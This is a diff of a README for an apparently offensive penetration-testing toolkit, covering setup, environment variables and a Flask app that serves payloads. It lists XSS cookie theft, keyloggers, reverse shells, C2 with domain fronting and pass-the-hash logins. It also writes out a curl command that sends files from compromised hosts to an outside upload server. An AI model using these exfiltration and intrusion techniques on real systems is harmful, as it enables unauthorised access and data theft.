@@ -2,11 +2,11 @@
 
 *Not so fine (you'll find out) bash and python scripts for incompetent bastards, like myself.*
 
-
+There's a <a href="https://incompetentbastard.nl">manual available</a> in Dutch. 
 
 command `screen -list` will show you the availabe screens.
 
-An here are some basics.....
+And here are some basics.....
 
 Press "Ctrl-A" on the keyboard and press "D" to detach from a screen
 
@@ -16,8 +16,46 @@ Press "Esc" to exit scrollback mode.
 
 
 
+## Quickstart
+
+```bash
+python3 -m venv .venv.
+ .venv/bin/activate
+pip install -r requirements-dev.txt
+```
+
+Start the app:
+
+```bash
+export SECRET_KEY="change-me"
+flask --app app:create_app run --host 127.0.0.1 --port 5000
+```
 
 
+## Environment variables
+
+Most important variables:
+
+- `SECRET_KEY`: session/CSRF secret
+- `DATABASE_URL`: SQLAlchemy database URL (default: local sqlite)
+- `MAX_CONTENT_LENGTH`: upload limit in bytes (default: `10485760`)
+- `PUBLIC_UPLOAD`: `true/false`, default `false`
+- `PUBLIC_DOWNLOADS`: `true/false`, default `false`
+- `IB_ADMIN_USER`: username for admin basic auth
+- `IB_ADMIN_PASSWORD`: password for admin basic auth
+- `DASHBOARD_ACCESS_TOKEN`: optional token for dashboard/API access from non-local clients (`X-Dashboard-Token`)
+- `TASK_RUNNER_TOKEN`: legacy fallback token for task-runner API (`X-Task-Token`)
+- `SESSION_COOKIE_SECURE`: `true/false`, set to `true` behind HTTPS
+
+Example:
+
+```bash
+export SECRET_KEY="super-long-random"
+export IB_ADMIN_USER="admin"
+export IB_ADMIN_PASSWORD="replace-this"
+export DASHBOARD_ACCESS_TOKEN="replace-this-too"
+export SESSION_COOKIE_SECURE="true"
+```
 
 
 
@@ -30,7 +68,7 @@ This script will setup the basisc things. Safe your OpenVPN file in the meuk dir
 
 If everything is well, you'll see the following results
 
-```
+```bash
 # screen -list                                                                                                                    
 There are screens on:
 	1708.metasploit	(07/22/2022 10:02:47 AM)	(Detached)
@@ -137,10 +175,6 @@ With other creds: `./vpn.sh 127.0.0.1 Administrator P@ssw0rd!`
 With Pash the Hash `./vpn.sh 127.0.0.1 Administrator x NTLMHASH`
 
 
-### ./gui.sh
-
-Yes, it comes with a GUI, well sort off....
-
 ## Python scripts onboard
 
 ### app.py
@@ -153,7 +187,7 @@ Elevating humanity with a new twisted variant of `python3 -m http.server 80` in 
 
 It currently supports:
 - serving payloads
-- basic reporting (owasp top 10 and CWE top 25) and note keeping
+- basic reporting and note keeping
 - xss payloads, extracting cookies, keylogger etc.
 - Quick overview of generated payloads by `reverseshell.sh`
 - Some bookmarks... yolo.
@@ -161,7 +195,6 @@ It currently supports:
 - Second Order SQLi
 - XXE
 - Upload directory. Easily extract files from hosts with with `curl -F file=@FILENAME https://incompetentbastard.com/upload`
-- Sync findings to DefectDojo
 - Domain fronting & C2 functionality
 - An overview (and interacting) of current attached screens and MSF sessions
 - Random quotes!
@@ -194,8 +227,9 @@ It also create some download links (lolbas/powershell) for the files at the `htt
 [Todo] Generates some extra custom payloads.
 
 
-
 # dependancies
+
+For when you are reluctant to blindly kick off `instal.sh`s
 
 For MacOS, this might help...
 
@@ -208,7 +242,7 @@ For MacOS, this might help...
 For KALI, try....
 
 - apt install mono-xbuild
-- `pip3 install dnsrecon asciinema nmaptocsv flask_bootstrap flask_migrate flask_admin --break-system-packages`
+- `pip3 install dnsrecon asciinema nmaptocsv flask_migrate flask_admin --break-system-packages`
 
 
 
